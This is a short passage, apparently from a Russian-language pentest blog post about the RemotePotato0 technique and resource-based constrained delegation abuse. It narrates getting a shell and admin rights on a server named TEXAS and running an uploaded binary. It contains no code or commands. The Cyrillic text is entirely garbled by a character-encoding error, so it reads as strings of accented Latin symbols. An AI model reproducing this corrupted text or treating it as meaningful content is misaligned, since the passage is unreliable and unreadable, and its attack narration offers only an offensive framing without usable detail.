–ø–æ–ª—É—á–∏—Ç—å —à–µ–ª–ª –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.

[![–¢–µ–ø–µ—Ä—å –º—ã –∑–∞–∫–æ–Ω–Ω—ã–µ –∞–¥–º–∏–Ω—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ TEXAS](/assets/images/remote-potato-0/rbcd-abuse.png)](/assets/images/remote-potato-0/rbcd-abuse.png)
{:.center-image}

–¢–µ–ø–µ—Ä—å –º—ã –∑–∞–∫–æ–Ω–Ω—ã–µ –∞–¥–º–∏–Ω—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ TEXAS
{:.quote}

–ü—Ä–∏–∫–æ–ª—å–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç –∞—Ç–∞–∫–∏, –Ω–æ –ø—Ä–æ—Ç–∞—â–∏—Ç—å –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –±–∏–Ω–∞—Ä—å, –∫–∞–∫ –º—ã –ø–æ–∫–∞–∑–∞–ª–∏ —Ä–∞–Ω–µ–µ, —Ç–æ–∂–µ –Ω–µ —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç –±–æ–ª—å—à–æ–≥–æ —Ç—Ä—É–¥–∞.
